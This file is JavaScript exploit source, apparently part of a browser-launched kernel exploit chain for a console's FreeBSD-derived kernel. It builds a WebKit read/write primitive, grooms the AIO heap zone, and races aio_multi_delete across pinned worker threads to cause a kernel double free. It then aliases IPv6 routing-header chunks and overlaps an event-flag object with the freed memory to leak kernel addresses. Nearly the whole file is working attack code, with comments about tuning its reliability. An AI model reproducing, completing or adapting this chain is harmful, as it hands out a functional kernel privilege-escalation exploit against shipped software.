        /* Walk a wider bidirectional window than netctrl's bf-8k (k=1..8)
           because on this build the master/victim landed at k=3/k=4 and the
           leak object fell outside that window, which aborted the pool with
           "shapes not found". The SHAPE PREDICATES are netctrl's proven
           ones, copied verbatim -- only the scan is widened. */
        let wm = null, wv = null, wl = null;
        const scan = [];
        for (let k = -8; k <= 16; ++k) {
            if (k === 0) continue;
            const val = p.read8(bf.sub32(8 * -k));
            if (!isPtrish(val)) { if (i === 0 && k > 0 && k <= 8) scan.push(k + ":nonptr"); continue; }
            const inl = p.read8(val.add32(0x10));
            const len = p.read4(val.add32(0x18)) >>> 0;
            if (i === 0 && k > 0 && k <= 8)
                scan.push(k + ":inl=" + hx(inl.low) + "/" + hx(inl.hi)
                    + " len=0x" + len.toString(16));
            /* netctrl's proven predicates, most specific first so a slot is
               not misread. leak: inl.hi==0 && inl.low==2; master: inl.hi>0
               && len==6; victim: inl.hi>0 && len==0x30. */
            if (!wl && inl.hi === 0 && inl.low === 2) wl = val;
            else if (!wm && inl.hi > 0 && len === 6) wm = val;
            else if (!wv && inl.hi > 0 && len === 0x30) wv = val;
        }
        if (i === 0) {
            mark("WORKER-WALK", "D=" + D + " storage=" + storage
                + " mc=" + mc + " bf=" + bf);
            mark("WORKER-SCAN", scan.join("  "));
        }
        if (!(wm && wv && wl)) {
            mark("WORKER-SHAPES-MISS", "name=" + name
                + " wm=" + !!wm + " wv=" + !!wv + " wl=" + !!wl
                + " scan=" + scan.join(","));
            throw new Error(name + ": shapes not found");
        }
        w.master = wm; w.origVector = p.read8(wm.add32(0x10));
        p.write8(wm.add32(0x10), wv); w.wired = true;
        trace("WORKER-STEP", name + " wired");
        await w.rpc("setup", 15000, wl.low, wl.hi);
        trace("WORKER-STEP", name + " setup ok");
        await w.rpc("armPivot", 15000, G.G0.low, G.G0.hi);
        w.armed = true;
        trace("WORKER-STEP", name + " armed");
        w.ctx = createContext({ p, offsets: off, gadgets: G, keepAlive });
    }

    raceWorkers = workers.slice();
    mark("WORKER-POOL", "n=" + raceWorkers.length);
    return workers.length === TOTAL_WORKERS;
}

/* Save the main thread's core/priority and pin main + every worker to
   MAIN_CORE at RT priority. Runs AFTER stageWorkers, exactly as netctrl's
   stageThreadAttrs runs after its stageWorkers. The saved core/priority are
   restored by lapseCleanup on the way out. */
async function stagePinThreads() {
    {
        const ID = new int64(-1, -1);
        const curMask = alloc(0x10);
        sc(SYS.cpuset_getaffinity, COMMON.CPU_LEVEL_WHICH,
            COMMON.CPU_WHICH_TID, ID, 0x10, curMask.addr);
        /* mask -> core index: shift down until zero, the count-1 is the
           highest set bit, which is the core we are currently on. */
        let bits = curMask.dv.getUint32(0, true) >>> 0, pos = 0;
        while (bits > 0) { bits = bits >>> 1; pos++; }
        prevCore = pos - 1;

        const curPrio = alloc(4);
        curPrio.dv.setUint16(0, PRI_REALTIME, true);
        curPrio.dv.setUint16(2, 0, true);
        sc(SYS.rtprio_thread, RTP_LOOKUP, 0, curPrio.addr);
        prevRtprio = curPrio.dv.getUint16(2, true);

        const mainMask = alloc(0x10);
        mainMask.dv.setUint32(0, 1 << MAIN_CORE, true);
        const mainPrio = alloc(4);
        mainPrio.dv.setUint16(0, PRI_REALTIME, true);
        mainPrio.dv.setUint16(2, MAIN_RTPRIO, true);
        const a = sc(SYS.cpuset_setaffinity, COMMON.CPU_LEVEL_WHICH,
            COMMON.CPU_WHICH_TID, ID, 0x10, mainMask.addr).i32;
        const r = sc(SYS.rtprio_thread, RTP_SET, 0, mainPrio.addr).i32;
        mark("MAIN-PINNED", "prev_core=" + prevCore
            + " prev_rtprio=" + prevRtprio + " -> core=" + MAIN_CORE
            + " affinity=" + a + " rtprio=" + r);

        const pinMask = alloc(0x10);
        pinMask.dv.setUint32(0, 1 << MAIN_CORE, true);
        const pinPrio = alloc(4);
        pinPrio.dv.setUint16(0, PRI_REALTIME, true);
        pinPrio.dv.setUint16(2, MAIN_RTPRIO, true);
        const pinAll = new int64(-1, -1);
        for (const w of workers) {
            await fireW(w, SYS.cpuset_setaffinity, [COMMON.CPU_LEVEL_WHICH,
                COMMON.CPU_WHICH_TID, pinAll, 0x10, pinMask.addr]);
            await fireW(w, SYS.rtprio_thread,
                [RTP_SET, 0, pinPrio.addr]);
        }
        mark("WORKERS-PINNED", "core=" + MAIN_CORE + " n=" + workers.length);
    }
}

async function stageRace() {
    state("stage 2: aio double-free race...", "warn");

    /* Workers FIRST, then pin, then the race setup -- netctrl's order. */
    if (!(await stageWorkers())) {
        check("worker-pool-is-up", false, workers.length + "/" + NUM_RACE_WORKERS);
        return false;
    }
    await stagePinThreads();

    pipeBuf = alloc(8);

    /* ---- race setup: the parts of the reference's setup() that the race
       actually depends on. ORDER HERE MATCHES NETCTRL: the worker pool is
       already up and every thread is pinned (stageWorkers + stagePinThreads
       above) before any of this runs.

       1. block NUM_WORKERS AIO workers on a socketpair. Their requests
          are submitted with AIO_CMD_READ against block_fd, so the aio
          zone holds NUM_WORKERS live blocked entries for the whole race
          -- this is the heap shape the double-free lands in.
       2. sds / sds_alt: the rthdr pool and the stage-4 reclaim pool.

       NOTE: there is deliberately NO libc call here. An earlier draft
       captured FPU control + MXCSR by calling libc's setjmp() through the
       ROP gate at stage 0 for a thr_new/longjmp trampoline that is gone.
       Every callAddr target in this chain must be a WebKit gadget or a
       libkernel syscall stub, exactly as in netctrl.

       The MAIN-THREAD PIN is deliberately NOT here. netctrl spawns its
       worker pool first (stageWorkers) and pins the main thread second
       (stageThreadAttrs). This chain used to pin the main thread BEFORE
       the worker pool, so the workers were spawned and had to run their
       own core.js primitive while the main thread sat on MAIN_CORE at RT
       priority -- the worker realm never got scheduled and the first
       rpc("init") never answered, which is the hang right after
       "race0 ping ok". Pin last, like the chain that works. */

    // blocked AIO workers on a socketpair
    {
        const spAb = alloc(8);
        if (sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0,
            spAb.addr).i32 !== 0) {
            mark("SETUP-SOCKETPAIR-FAILED", "");
            return false;
        }
        blockFd = spAb.dv.getInt32(0, true);
        unblockFd = spAb.dv.getInt32(4, true);
        const NUM_BLOCK = params.has("blockworkers")
            ? parseInt(params.get("blockworkers"), 10) : NUM_WORKERS;
        const blockReqs = alloc(AIO_REQ_SIZE * NUM_BLOCK);
        for (let i = 0; i < NUM_BLOCK; ++i) {
            const o = i * AIO_REQ_SIZE;
            blockReqs.dv.setUint32(o + 0x08, 1, true);
            blockReqs.dv.setUint32(o + 0x20, blockFd >>> 0, true);
        }
        const blockIds = alloc(4 * NUM_BLOCK);
        const frc = submitCmd(AIO_CMD_READ, blockReqs, NUM_BLOCK, 3, blockIds);
        if (frc !== 0) {
            mark("SETUP-BLOCK-AIO-FAILED", "rc=" + frc);
            return false;
        }
        blockId = blockIds.dv.getInt32(0, true);
        mark("AIO-WORKERS-BLOCKED", "n=" + NUM_BLOCK
            + " block_fd=" + blockFd + " unblock_fd=" + unblockFd
            + " id=" + blockId);
    }

    /* GROOM THE AIO ZONE -- before ANY socket exists.

       The reference's setup() order is fixed: groom, then sds, then
       sds_alt. Grooming first means the ~NUM_GROOMS freed aio_entry
       slots are already placed when the sockets and their ip6po_rthdr
       chunks are allocated, so those chunks land in the zone the race
       will later double-free. */
    {
        const groomReqs = makeReqs(3);
        const groomIdsBuf = alloc(4 * NUM_GROOMS);
        sprayAio(NUM_GROOMS, groomReqs, 3, groomIdsBuf, false, AIO_CMD_READ);
        cancelAios(groomIdsBuf, NUM_GROOMS);
        groomIds.length = 0;
        for (let i = 0; i < NUM_GROOMS; ++i)
            groomIds.push(groomIdsBuf.dv.getInt32(i * 4, true));
        /* Keep the ids BUFFER address for cleanup: groomIds holds plain
           numbers, so cleanup cannot recover the address from them. */
        groomIdsAddr = groomIdsBuf.addr;
        mark("GROOM", "n=" + NUM_GROOMS + " ids=" + groomIds.length);
    }

    // sds -- the main rthdr pool, AFTER the groom
    for (let i = 0; i < NUM_SDS; ++i) {
        const sd = newUdp6();
        sds.push(sd);
    }
    mark("SDS", "opened=" + sds.length);
    if (!check("race-sockets-open", sds.length === NUM_SDS,
        sds.length + "/" + NUM_SDS)) return false;

    // sds_alt -- the stage-4 reclaim pool
    for (let i = 0; i < NUM_SDS_ALT; ++i) {
        const sd = newUdp6();
        sdsAlt.push(sd);
    }
    mark("SDS-ALT", "opened=" + sdsAlt.length);
    if (!check("alt-sockets-open", sdsAlt.length === NUM_SDS_ALT,
        sdsAlt.length + "/" + NUM_SDS_ALT)) return false;


    // TCP listener the race request targets
    const serverAddr = alloc(16);
    serverAddr.u8.fill(0);
    serverAddr.u8[1] = AF_INET;
    serverAddr.dv.setUint16(2, 0, true);
    serverAddr.dv.setUint32(4, 0x0100007f, true);   // 127.0.0.1
    const sdListen = newTcp();
    const enable = alloc(4);
    enable.dv.setUint32(0, 1, true);
    sc(SYS.setsockopt, sdListen, COMMON.SOL_SOCKET, SO_REUSEADDR, enable.addr, 4);
    if (sc(SYS.bind, sdListen, serverAddr.addr, 16).i32 !== 0) {
        mark("RACE-BIND-FAILED", "");
        return false;
    }
    const addrLen = alloc(4);
    addrLen.dv.setUint32(0, 16, true);
    sc(SYS.getsockname, sdListen, serverAddr.addr, addrLen.addr);
    const port = serverAddr.dv.getUint16(2, true);
    mark("RACE-LISTEN", "port=" + port);
    sc(SYS.listen, sdListen, 1);

    const numReqs = 3;
    const whichReq = numReqs - 1;
    const reqs = makeReqs(numReqs);
    const aioIds = alloc(4 * numReqs);
    const reqAddr = aioIds.addr.add32(whichReq * 4);
    const errors = alloc(4 * numReqs);

    for (let attempt = 1; attempt <= NUM_RACES && !triplets; ++attempt) {
        trace("RACE-ATTEMPT", `attempt=${attempt}/${NUM_RACES}`);
        const sdClient = newTcp();
        if (sc(SYS.connect, sdClient, serverAddr.addr, 16).i32 !== 0) {
            sc(SYS.close, sdClient);
            continue;
        }
        const sdConn = sc(SYS.accept, sdListen, 0, 0).i32;
        const linger = alloc(8);
        linger.dv.setUint32(0, 1, true);
        linger.dv.setUint32(4, 1, true);
        sc(SYS.setsockopt, sdClient, COMMON.SOL_SOCKET, SO_LINGER, linger.addr, 8);
        reqs.dv.setUint32(whichReq * AIO_REQ_SIZE + 0x20, sdClient >>> 0, true);

        if (submitCmd(AIO_CMD_MULTI_READ, reqs, numReqs, 3, aioIds) !== 0) {
            sc(SYS.close, sdClient); sc(SYS.close, sdConn);
            continue;
        }
        multiCancel(aioIds, numReqs, errors);
        multiPoll(aioIds, numReqs, errors);
        sc(SYS.close, sdClient);

        /* raceOne is async -- it MUST be awaited. Without the await, `got`
           is a Promise, which is always truthy, so every round reported a
           win and skipped straight to the alias hunt while the race was
           still running. multiDelete/close then pulled the fds out from
           under it. */
        const got = await raceOne(reqAddr, sdConn);
        multiDelete(aioIds, numReqs, errors);
        sc(SYS.close, sdConn);

        if (got) {
            mark("RACE-WON", "attempt " + attempt + "/" + NUM_RACES);
            /* Pass the LIVE pool, not a slice: makeAliasedRthdrs splices
               the aliased pair out and pushes fresh replacement sockets
               in, and those replacements must land in sds so they are
               used downstream and closed by cleanup. */
            const pair = makeAliasedRthdrs(sds);
            if (pair) {
                triplets = { a: pair[0], b: pair[1] };
                check("race-produced-aliased-rthdrs", true,
                    "a=" + pair[0] + " b=" + pair[1] + " at attempt " + attempt);
            } else {
                mark("ALIAS-FAILED", "race won but no aliased rthdr in " + NUM_ALIAS + " loops");
            }
        }
        if (!(attempt % 10)) await forceYield();
    }

    sc(SYS.close, sdListen);
    if (!triplets) {
        check("race-produced-aliased-rthdrs", false,
            "no win in " + NUM_RACES + " attempts");
        return false;
    }
    return true;
}
/* ---- the AIO race, on the worker pool --------------------------------
 * The vue reference drives this with thr_new: spawn a thread running a
 * ROP chain that pins itself, parks in read(pipe), then runs
 * aio_multi_delete after main's own delete.
 *
 * A worker fire is ONE syscall (layoutContext lays out target + at most
 * six args), so the reference's multi-step chain CANNOT be handed to a
 * worker as one fire. The roles are therefore split across fires, the way
 * netctrl pins its workers with separate awaited fires:
 *
 *   chain's pin (cpuset/rtprio) -> two awaited fireW calls at pool setup
 *   chain's read(pipe) park     -> fire #1: SYS.read -- the fire promise
 *                                  NOT settling is the ready signal
 *   thr_resume (write pipe)     -> main writes the pipe, then
 *   chain's aio_multi_delete    -> fire #2: the second free
 *
 * Two deletes of the same reqAddr, the second against an already-freed
 * queue_ent[], is the same double free the suspend/resume window buys.
 */
async function raceOne(reqAddr, tcpSock) {
    if (!raceWorkers.length) {
        mark("RACE-NO-WORKERS", "the worker pool is empty");
        return false;
    }
    const w = raceWorkers[0];

    const sceErrs = alloc(0x100);
    sceErrs.dv.setUint32(0, 0xffff, true);
    sceErrs.dv.setUint32(4, 0xffff, true);

    const pfd = alloc(8);
    if (sc(SYS.pipe, pfd.addr).i32 === -1) return false;
    const pipeReadFd0 = pfd.dv.getInt32(0, true);
    const pipeWriteFd0 = pfd.dv.getInt32(4, true);

    /* fire #1: park the worker thread in read() BEFORE its delete. A
       fire is one syscall, so the park IS the fire; the promise not
       settling is the ready signal (its rpc timer is 0, i.e. none, so
       the park never rejects spuriously). */
    const parked = fireW(w, SYS.read,
        [pipeReadFd0, pipeBuf.addr, 1], 0);
    parked.settled = false;
    parked.then(() => { parked.settled = true; },
        () => { parked.settled = true; });
    const parkDl = Date.now() + 3000;
    while (!parked.settled && Date.now() < parkDl)
        await new Promise(r => setTimeout(r, 5));
    if (parked.settled) {
        mark("RACE-WORKER-NEVER-READY",
            "worker returned instead of parking in read");
        sc(SYS.close, pipeReadFd0); sc(SYS.close, pipeWriteFd0);
        return false;
    }
    mark("RACE-PARKED", `worker parked in read(${pipeReadFd0})`);

    /* Workers are parked in read() BEFORE their aio_multi_delete. Main
       deletes now: first delete frees the entry. */
    const tcpScratch = alloc(SIZE_TCP_INFO);
    sc(SYS.aio_multi_poll, reqAddr, 1, tcpScratch.addr);
    const pollRes = tcpScratch.dv.getInt32(0, true);
    const lp = alloc(4);
    lp.dv.setUint32(0, SIZE_TCP_INFO, true);
    sc(SYS.getsockopt, tcpSock, IPPROTO_TCP, TCP_INFO,
        tcpScratch.addr, lp.addr);
    const tcpState = tcpScratch.u8[0];
    trace("RACE-PROBE", `poll=0x${(pollRes >>> 0).toString(16)}`
        + ` tcp_state=0x${tcpState.toString(16)}`);

    let won = false;
    if (pollRes !== SCE_KERNEL_ERROR_ESRCH && tcpState !== TCPS_ESTABLISHED) {
        sc(SYS.aio_multi_delete, reqAddr, 1, sceErrs.addr);
        won = true;
        trace("RACE-WON-ROUND", `poll=0x${(pollRes >>> 0).toString(16)}`
            + ` tcp_state=0x${tcpState.toString(16)}`);
    }

    /* Release the park, wait for the worker to come back (its message
       loop must be free before it can take fire #2), then run the
       worker's OWN aio_multi_delete against the same reqAddr -- the
       second free. */
    sc(SYS.write, pipeWriteFd0, pipeBuf.addr, 1);
    await boundedJoin([parked], JOIN_MS, "race-park");

    await fireW(w, SYS.aio_multi_delete,
        [reqAddr, new int64(1, 0), sceErrs.addr.add32(4)], JOIN_MS);

    let ok = false;
    if (won) {
        const e1 = sceErrs.dv.getInt32(0, true);
        const e2 = sceErrs.dv.getInt32(4, true);
        mark("RACE-ERRS", `main=${e1} worker=${e2}`);
        ok = (e1 === e2 && e1 === 0);
    }
    sc(SYS.close, pipeReadFd0);
    sc(SYS.close, pipeWriteFd0);
    return ok;
}

/* Alias two sockets' ip6po_rthdr onto the double-freed chunk. */
function makeAliasedRthdrs(list) {
    const MARK = 4, size = 0x80;
    const buf = alloc(size);
    const rsize = buildRthdr(buf, size);
    for (let loop = 0; loop < NUM_ALIAS; ++loop) {
        for (let i = 1; i <= Math.min(list.length, NUM_SDS); ++i) {
            const sd = list[i - 1];
            if (sd > 0) {
                buf.u8.fill(0);
                buf.dv.setUint32(MARK, i, true);
                setRthdr(sd, buf, rsize);
            }
        }
        for (let i = 1; i <= Math.min(list.length, NUM_SDS); ++i) {
            const sd = list[i - 1];
            if (sd <= 0) continue;
            const n = getRthdr(sd, buf, size);
            if (n < 0) continue;
            const marker = buf.dv.getUint32(MARK, true) >>> 0;
            /* A tag that names a slot outside the list is a stale or
               short read, not an alias -- log it rather than index the
               array with it. */
            if (marker !== i && marker > 0
                && marker > Math.min(list.length, NUM_SDS)) {
                if (loop === 0 && i <= 3)
                    mark("ALIAS-OUT-OF-RANGE", `read_fd=${sd}`
                        + ` i=${i} marker=${marker} read_len=${n}`
                        + ` list=${list.length} num_sds=${NUM_SDS}`);
                continue;
            }
            if (marker !== i && marker > 0 && marker <= NUM_SDS) {
                const a = list[i - 1], b = list[marker - 1];
                if (b > 0) {
                    mark("ALIAS-FOUND", `sd=${a} aliased=${b}`
                        + ` marker=${marker} loop=${loop}`);
                    /* Settle the heap before returning, exactly as the
                       reference does: release the rthdr on every OTHER
                       socket so those chunks stop competing for the freed
                       one, then replace the two spliced fds so the pool
                       stays NUM_SDS strong.

                       Without this the freed chunk is re-consumed the
                       moment stage 3 closes the twin, and the master's
                       dangling rthdr reads back nothing (len=-1). */
                    const hi = Math.max(i - 1, marker - 1);
                    const lo = Math.min(i - 1, marker - 1);
                    list.splice(hi, 1);
                    list.splice(lo, 1);
                    for (const fd of list) {
                        if (fd > 0) freeRthdr(fd);
                    }
                    for (let k = 0; k < 2; ++k) {
                        const fresh = newUdp6();
                        list.push(fresh);
                    }
                    mark("ALIAS-SETTLED", `others_freed=${list.length}`
                        + ` pair=${a},${b}`);
                    return [a, b];
                }
            }
        }
    }
    return null;
}

/* ---- cleanup ---------------------------------------------------------
 * The reference's cleanup(). Undoes everything stage 0 did, in reverse:
 * release the blocked AIO workers, free the groom queue, close both
 * socket pools and the pair, then put the thread back on the core and
 * priority it started on.
 *
 * This runs on EVERY exit path (success or failure). Leaving the main
 * thread pinned at RT priority on core 4 with 2 blocked aio workers and
 * ~112 open sockets is what poisons the page for the next attempt -- the
 * primitive then grooms against a heap that is still shaped by the
 * previous run.
 *
 * FAIL-SAFE: alloc() needs bufAddr, which stagePrimitive installs. If the
 * primitive never got that far, every alloc() here would throw
 * "bufAddr is not a function" and the cleanup would abort on its first
 * line -- the exact CLEANUP-THREW seen in the live log. stageTeardown
 * guards this with stoppedEarly, and this function ALSO checks the
 * precondition itself so it is safe if called directly.
 */
function lapseCleanup(why) {
    if (!bufAddr || !sc) {
        mark("CLEANUP-SKIPPED", `at=${why} bufAddr=${!!bufAddr} sc=${!!sc}`);
        return;
    }
    mark("CLEANUP", `at=${why}`);
    const errs = alloc(4 * 8);

    // release the blocked AIO workers first -- they hold live entries
    if (blockId !== -1) {
        const idAb = alloc(4);
        idAb.dv.setUint32(0, blockId >>> 0, true);
        sc(SYS.aio_multi_wait, idAb.addr, 1, errs.addr, 1, 0);
        sc(SYS.aio_multi_delete, idAb.addr, 1, errs.addr);
        mark("CLEANUP-UNBLOCKED", `id=${blockId}`);
        blockId = -1;
    }

    // free the groom queue (groomIds holds plain numbers, not objects,
    // so the address comes from the buffer captured at groom time)
    if (groomIdsAddr) {
        freeAios({ addr: groomIdsAddr }, NUM_GROOMS, false);
        groomIdsAddr = null;
        groomIds.length = 0;
    }

    if (blockFd >= 0) { sc(SYS.close, blockFd); blockFd = -1; }
    if (unblockFd >= 0) { sc(SYS.close, unblockFd); unblockFd = -1; }

    let closed = 0;
    for (const fd of sds) if (fd > 0 && sc(SYS.close, fd).i32 === 0) closed++;
    sds.length = 0;
    for (const fd of sdsAlt) if (fd > 0 && sc(SYS.close, fd).i32 === 0) closed++;
    sdsAlt.length = 0;
    mark("CLEANUP-SOCKETS", `closed=${closed}`);

    // restore the core and priority we found
    if (prevCore >= 0) {
        const maskAb = alloc(0x10);
        maskAb.dv.setUint32(0, 1 << prevCore, true);
        sc(SYS.cpuset_setaffinity, COMMON.CPU_LEVEL_WHICH,
            COMMON.CPU_WHICH_TID, new int64(-1, -1), 0x10, maskAb.addr);
        mark("CLEANUP-CORE-RESTORED", `core=${prevCore}`);
        prevCore = -1;
    }
    const prioAb = alloc(4);
    prioAb.dv.setUint16(0, PRI_REALTIME, true);
    prioAb.dv.setUint16(2, prevRtprio, true);
    sc(SYS.rtprio_thread, RTP_SET, 0, prioAb.addr);
    mark("CLEANUP-DONE", `rtprio=${prevRtprio}`);
}

/* Worker-side teardown, the half of netctrl's stageTeardown that the
   earlier lapse draft omitted entirely. Without this a failed run leaves
   every worker's Math.expm1 gate ARMED and its master object still
   pointing at the victim, so the page is left in a worse state than a
   working chain would leave it -- the exact residue that poisons the next
   run's primitive groom.

   Order mirrors netctrl: disarm the gate first (so no worker can pivot
   through G.G0 again), restore each master vector, terminate the worker,
   and finally put the MAIN thread's expm1 back. */
async function lapseTeardownWorkers(why) {
    const DISARM_MS = params.has("disarmms")
        ? parseInt(params.get("disarmms"), 10) : 1000;
    let disarmed = 0, disarmFailed = 0;
    const failures = [];
    for (const w of workers) {
        try {
            if (!w.armed) {
                trace("WORKER-DISARM-SKIPPED", w.name + " not armed");
                continue;
            }
            await w.rpc("disarm", DISARM_MS);
            w.armed = false;
            disarmed++;
            // Per-worker detail goes to the XHR only; one summary row below.
            trace("WORKER-DISARMED", w.name + "");
        } catch (e) {
            disarmFailed++;
            failures.push(w.name + "("
                + ((e && e.message) ? e.message : String(e)) + ")");
            // Failure detail is still verbose-only; the count lands in the
            // summary mark below, so a normal run is not spammed per worker.
            trace("WORKER-DISARM-THREW", w.name + " " + ((e && e.message) ? e.message : String(e)));
        }
    }
    if (workers.length)
        mark("WORKERS-DISARMED", `at=${why} disarmed=${disarmed}/`
            + workers.length
            + (disarmFailed ? " skipped=" + failures.join(",") : "")
            + ` timeout_ms=${DISARM_MS}`);
    for (const w of workers) {
        try {
            if (w.wired && w.master && w.origVector && p) {
                p.write8(w.master.add32(0x10), w.origVector);
                w.wired = false;
                trace("WORKER-VECTOR-RESTORED", w.name + " ok");
            }
        } catch (e) {
            trace("WORKER-VECTOR-RESTORE-THREW", w.name + " " + ((e && e.message) ? e.message : String(e)));
        }
    }
    for (const w of workers) {
        try { if (w.worker) w.worker.terminate(); } catch (e) { }
    }
    try {
        if (mainArmed && mainMf && mainOrig && p) {
            p.write8(mainMf, mainOrig);
            mainArmed = false;
            mark("EXPM1-RESTORED", "expm1(1)=" + Math.expm1(1));
        }
    } catch (e) { mark("DISARM-THREW", (e && e.message) ? e.message : String(e)); }
}
/* =====================================================================
 * STAGE 3 -- leak kernel addresses.
 *
 * lapse's own technique, NOT netctrl's kqueue leak. An evf is confused
 * with the aliased rthdr chunk: create NUM_HANDLES evfs whose flags carry
 * a tag, read the chunk back through the master rthdr, and the tag that
 * appears names the evf now living on that chunk. Setting its flags then
 * writes through the rthdr, so a read-back exposes the evf's kernel
 * pointers -- among them the "evf cv" string, from which kernelBase
 * follows.
 *
 * After that, a forged aio reqs3 (built into the rthdr payload) is
 * sprayed alongside real multis, and scanning the read-back for a verified
 * aio_entry yields the reqs2 offset. That gives us the kbuf/reqs addresses
 * the arw stage needs.
 * ===================================================================== */

function evfCreate(nameAddr, flags) {
    return sc(SYS.evf_create, nameAddr, 0, flags).i32;
}
function evfClear(id) { return sc(SYS.evf_clear, id, 0).i32; }
function evfSet(id, flags) { return sc(SYS.evf_set, id, flags).i32; }
function evfDelete(id) { return sc(SYS.evf_delete, id).i32; }
function setEvfFlags(id, flags) {
    const c = evfClear(id);
    if (c === -1) return false;
    return evfSet(id, flags) !== -1;
}
function freeEvf(id) { evfDelete(id); }

/* verify_reqs2: an aio_entry is recognisable by its command word, a run
   of 0xffff heap-tag prefixes, a small state, a zeroed field, and at
   least two matching prefix values. Same shape test the reference uses. */
function verifyReqs2(base, cmd) {
    if (base.dv.getUint32(0, true) !== cmd) return false;
    const prefixes = [];
    for (let i = 0x10; i <= 0x20; i += 8) {
        if (base.dv.getUint16(i + 6, true) !== 0xffff) return false;
        prefixes.push(base.dv.getUint16(i + 4, true));
    }
    const s1 = base.dv.getUint32(0x38, true);
    const s2 = base.dv.getUint32(0x3c, true);
    if (!(s1 > 0 && s1 <= 4) || s2 !== 0) return false;
    if (base.dv.getUint32(0x40, true) !== 0
        || base.dv.getUint32(0x44, true) !== 0) return false;
    for (let i = 0x48; i <= 0x50; i += 8) {
        if (base.dv.getUint16(i + 6, true) === 0xffff) {
            if (base.dv.getUint16(i + 4, true) !== 0xffff)
                prefixes.push(base.dv.getUint16(i + 4, true));
        } else if (i === 0x50
            || (base.dv.getUint32(i, true) !== 0
                || base.dv.getUint32(i + 4, true) !== 0)) {
            return false;
        }
    }
    if (prefixes.length < 2) return false;
    for (let i = 1; i < prefixes.length; ++i)
        if (prefixes[i] !== prefixes[0]) return false;
    return true;
}

async function leakKernelAddrs(sdPair, sockList) {
    const masterSd = sdPair.a;
    const buflen = 0x80 * LEAK_LEN;
    const name = alloc(1);

    // Baseline: what does the master's rthdr read as BEFORE we touch
    // anything? If we cannot read the chunk at all here, the evf hunt
    // below is chasing something that is already gone.
    {
        const g0 = readRthdr(masterSd, 0x80);
        mark("LEAK-BASE", `pre-close len=${g0}`
            + (g0 >= 0 ? ` word0=${hx(leakDv.getUint32(0, true) >>> 0)}`
                + ` word4=${hx(leakDv.getUint32(4, true) >>> 0)}`
                + ` marker=${leakDv.getUint32(4, true) >>> 0}` : ""));
    }

    sc(SYS.close, sdPair.b);      // the twin is no longer needed
    sc(SYS.sched_yield);
    sc(SYS.sched_yield);

    {
        const g1 = readRthdr(masterSd, 0x80);
        mark("LEAK-BASE", `post-close len=${g1}`
            + (g1 >= 0 ? ` word0=${hx(leakDv.getUint32(0, true) >>> 0)}`
                + ` word4=${hx(leakDv.getUint32(4, true) >>> 0)}` : ""));
    }

    // ---- confuse an evf with the aliased rthdr chunk ----
    let evf = -1;
    for (let attempt = 1; attempt <= NUM_ALIAS && evf < 0; ++attempt) {
        const evfs = [];
        for (let j = 1; j <= NUM_HANDLES; ++j) {
            evfs.push(evfCreate(name.addr, EVF_FLAG_TAG | (j << 16)));
            /* NUM_HANDLES evf_create in a row with no yield is that many
               synchronous ROP syscalls; the whole attempt is ~2x with the
               frees below. Breathe so the page stays alive. */
            if ((j & 0x3f) === 0x3f) await forceYield();
        }
        /* Read 0x80 CAPACITY, but do NOT gate on it. buildRthdr() for a
           0x80 buffer emits a 0x78-byte rthdr (len = ((0x80>>3)-1)&~1),
           so getsockopt legitimately returns 0x78. Demanding 0x80 made
           every single attempt a short read -- that was the n=100 in
           SHORT-READS. Only the flag word at +0 matters here. */
        const got = readRthdr(masterSd, 0x80);
        if (got >= 0) {
            const flag = leakDv.getUint32(0, true) >>> 0;
            /* Say what we actually read, first few attempts: if the word is
               the stale 0xee fill or a rthdr header rather than an evf
               flag, we are not looking at a chunk an evf reclaimed. */
            if (attempt <= 3) {
                trace("EVF-SCAN", `attempt=${attempt} len=${got}`
                    + ` word0=${hx(flag)}`
                    + ` tagbits=${hx(flag & 0xffff0000)}`
                    + ` first_evf=${evfs[0]}`);
            }
            if ((flag & EVF_FLAG_TAG) === EVF_FLAG_TAG) {
                const idx = (flag >>> 16) & 0xffff;
                const want = (flag | 1) >>> 0;
                const cand = evfs[idx - 1];
                if (cand !== undefined && setEvfFlags(cand, want)) {
                    const got2 = readRthdr(masterSd, 0x80);
                    if (got2 >= 0 && (leakDv.getUint32(0, true) >>> 0) === want) {
                        evf = cand;
                        evfs.splice(idx - 1, 1);
                    }
                }
            }
        } else if (attempt <= 3) {
            trace("EVF-SCAN", `attempt=${attempt} READ-FAILED`);
        }
        let freed = 0;
        for (const e of evfs) {
            if (e === evf) continue;
            freeEvf(e);
            if ((++freed & 0x3f) === 0x3f) await forceYield();
        }
        if (evf >= 0) {
            mark("EVF-RTHDR-CONFUSED", `attempt=${attempt} evf=${evf}`);
            break;
        }
        await forceYield();
    }
    if (!check("evf-confused-with-rthdr-chunk", evf >= 0,
        `no evf landed on the chunk in ${NUM_ALIAS} attempts`)) return false;

    if (!setEvfFlags(evf, EVF_FLAG_FINAL)) {
        mark("EVF-FLAG-SET-FAILED", `evf=${evf}`);
        return false;
    }
    if (readRthdr(masterSd, buflen, 0x48) < 0) {
        mark("EVF-READBACK-SHORT", "after flag set");
        return false;
    }
    kernelAddr = new int64(leakDv.getUint32(0x28, true),
        leakDv.getUint32(0x2c, true));
    kbufAddr = new int64(leakDv.getUint32(0x40, true),
        leakDv.getUint32(0x44, true)).sub32(0x38);
    mark("KERNEL-PTRS", `"evf cv"=${kernelAddr} kbuf=${kbufAddr}`);
    if (!check("evf-cv-and-kbuf-are-kernel-pointers",
        isKernelPtr(kernelAddr) && isKernelPtr(kbufAddr),
        `cv=${kernelAddr} kbuf=${kbufAddr}`)) return false;

    // ---- forge a reqs3 and scan for a real aio_entry (reqs2) ----
    const wbufsz = 0x80;
    const wbuf = alloc(wbufsz);
    const rsize = buildRthdr0(wbuf.dv, wbufsz);
    const MARKER = 0xdeadbeef;
    const R3 = 0x10;
    /* Forge the struct with put(), as the reference does -- it writes the
       low and high words together, so a qword field cannot be half set.
       ar3_lock.lk_lock (+0x38) is a full qword = LK_UNLOCKED. */
    put(wbuf.dv, 4, MARKER);              // marker for the scan
    put(wbuf.dv, R3 + 0x00, 1);           // .ar3_num_reqs
    put(wbuf.dv, R3 + 0x04, 0);           // .ar3_reqs_left
    put(wbuf.dv, R3 + 0x08, AIO_STATE_COMPLETE);   // .ar3_state
    put(wbuf.dv, R3 + 0x0c, 0);           // .ar3_done
    put(wbuf.dv, R3 + 0x28, 0x67b0000);   // .ar3_lock.lock_object.lo_flags
    put(wbuf.dv, R3 + 0x38, 1);           // .ar3_lock.lk_lock = LK_UNLOCKED

    const numElems = 6;
    const ucredP = kbufAddr.add32(4);
    const leakReqs = makeReqs(numElems);
